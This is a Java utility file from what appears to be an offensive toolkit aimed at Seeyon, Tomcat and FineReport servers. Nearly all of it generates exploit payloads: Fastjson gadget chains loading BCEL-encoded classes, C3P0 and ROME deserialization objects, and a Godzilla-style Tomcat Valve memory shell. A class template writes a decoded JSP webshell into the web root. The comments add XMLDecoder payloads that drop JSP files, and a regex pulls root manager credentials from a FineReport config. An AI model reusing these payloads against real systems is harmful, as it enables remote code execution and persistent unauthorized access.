package com.droplab.Utils;

import com.droplab.Controller.Seeyon.Common.ROMEObject;
import com.droplab.Utils.Echo.TomcatEcho;
import com.droplab.Utils.Factory.CodeFactory;
import com.droplab.Utils.Memory.MemroyFactory;
import com.sun.org.apache.bcel.internal.classfile.Utility;

import java.io.File;
import java.nio.file.Files;
import java.util.Base64;
import java.util.Random;

public class TestUtils {
    public static void main(String[] args) throws Exception {
        /*//String pattern="<rootManagerPassword>\\s*(<!\\[CDATA\\[)*([_0-9a-zA-Z]*)(\\]\\]>)*\\s*</rootManagerPassword>";
        String pattern="<rootManagerName>\\s*(<!\\[CDATA\\[)*([_\\-0-9a-zA-Z]*)(\\]\\]>)*\\s*</rootManagerName>";
        String content="<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                "<PrivilegeManager xmlVersion=\"20170715\" releaseVersion=\"8.0.0\" fsSystemManagerPassSet=\"true\" male=\"false\">\n" +
                "<rootManagerName>\n" +
                "<![CDATA[admin]]></rootManagerName>\n" +
                "<rootManagerPassword>___0072002a00670066000sa</rootManagerPassword>\n" +
                "<AP class=\"com.fr.privilege.providers.NoAuthenticationProvider\"/>\n" +
                "<ForwardUrl>\n" +
                "<![CDATA[${servletURL}?op=fr_platform]]></ForwardUrl>\n" +
                "</PrivilegeManager>\n";
        Pattern r = Pattern.compile(pattern);
        Matcher m = r.matcher(content);
        if (m.find()) {
            String group = m.group(2);
            System.out.println(group);
            System.out.println(m.end());
        }*/

        /*String uploadShell = CodeFactory.instance().getUploadShell("com.mchange.v2.c3p0.PoolBackedDataSource",
                CommonUtils.Random(), new File("C:\\Users\\Administrator\\Desktop\\tmp\\godzila\\helps.jsp"));
        String anyCodeExecute = PayloadFactory.instance().getAnyCodeExecute();
        String format = String.format(anyCodeExecute, uploadShell);
        byte[] object = C3P0SerializeObject.instance().getObject(format);
        StringBuffer sb = new StringBuffer();
        sb.append("HexAsciiSerializedMap");
        sb.append('[');
        sb.append(ByteUtils.toHexAscii(object));
        sb.append(']');
        String s = sb.toString();
        //{"a":{"@type":"java.lang.Class","val":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"},"b":{"@type":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource","userOverridesAsString":"ffff"}}
        String payload="{\"a\":{\"%s\":\"%s\",\"%s\":\"%s\"},\"b\":{\"%s\":\"%s\",\"%s\":\"%s\"}}";
        String userOverridesAsString = String.format(payload,
                CommonUtils.string2Unicode("@type"),
                CommonUtils.string2Unicode("java.lang.Class"),
                CommonUtils.string2Unicode("val"),
                CommonUtils.string2Unicode("com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"),
                CommonUtils.string2Unicode("@type"),
                CommonUtils.string2Unicode("com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"),
                CommonUtils.string2Unicode("userOverridesAsString"),
                s);
        System.out.println(userOverridesAsString);*/

/*        //String payload = "{\"name\":{\"@type\" : \"java.lang.Class\",\"val\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\"},\"x\" : {\"name\": {\"@type\" : \"java.lang.Class\",\"val\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"y\": {\"@type\":\"com.alibaba.fastjson.JSONObject\",\"c\": {\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\"driverClassLoader\": {\"@type\" : \"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\":\"%s\",\"$ref\": \"$.x.y.c.connection\"}}}}";
        String payload="{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\"},\"b\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"x\":{\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\":\"%s\"}}";
        //byte[] decode = Base64.getDecoder().decode(TomcatEcho.instance().getTomcatEcho());
        byte[] decode = Base64.getDecoder().decode(CodeFactory.instance().getUploadShell("com.alibaba.fastjson.JSON", CommonUtils.Random(), new File("C:\\Users\\Administrator\\Desktop\\1\\hellowebform.jsp")));
        String encode = Utility.encode(decode, true);
        System.out.println(encode);
        String format = String.format(payload, "$$BCEL$$" + encode);
        System.out.println(format);*/

        String template = TomcatEcho.instance().getTomcatEchoDefineClass("", "template");
        byte[] decode = Base64.getDecoder().decode(template);

        byte[] object = ROMEObject.instance().getObject(decode);
        Files.write(new File("C:\\language\\java\\source\\DropLabTools\\src\\main\\java\\com\\droplab\\Controller\\Seeyon\\Common\\test.txt").toPath(), object);

        String memoryShell = MemroyFactory.instance().getMemoryShell("Tomcat", "Valve", "password", "Godzilla", "");
        System.out.println(memoryShell);

        String uploadShell = "import java.io.PrintWriter;public class %s {public %s(){PrintWriter bsh = null;try {bsh = new PrintWriter(Thread.currentThread().getContextClassLoader().loadClass(\"%s\").getProtectionDomain().getCodeSource().getLocation().getPath().split(\"WEB-INF\")[0] + \"%s.jsp\");bsh.write(new String(java.util.Base64.getDecoder().decode(\"%s\")));bsh.close();} catch (Exception e) { }}}";

        System.out.println(uploadShell);


    }
}

/*
<java>
<void class="sun.misc.BASE64Decoder">
<void method="decodeBuffer" id="decodeStr">
<string></string>
</void>
</void> <void class="org.mozilla.javascript.DefiningClassLoader">
<void method="defineClass">
<string>addValve</string>
<object idref="decodeStr"/>
<void method="newInstance"></void> </void>
</void>
</java>


<java>
<void class="org.mozilla.javascript.DefiningClassLoader">
<void method="loadClass" id="class">
<string>bsh.Interpreter</string>
<boolean>false</boolean>
</void>
</void>
<object idref="class">
<void method="getProtectionDomain">
    <void method="getCodeSource">
        <void method="getLocation">
            <void method="getPath">
            </void>
        </void>
    </void>
</void>
</object>
</java>


<java>
<void class="bsh.Interpreter">
<void method="eval">
<string>PrintWriter bsh = new PrintWriter(Thread.currentThread().getContextClassLoader().loadClass("bsh.Interpreter").getProtectionDomain().getCodeSource().getLocation().getPath().split("bsh")[0] + "hrs.jsp");bsh.write("123123");bsh.close();</string>
</void>
</void>
</java>
*/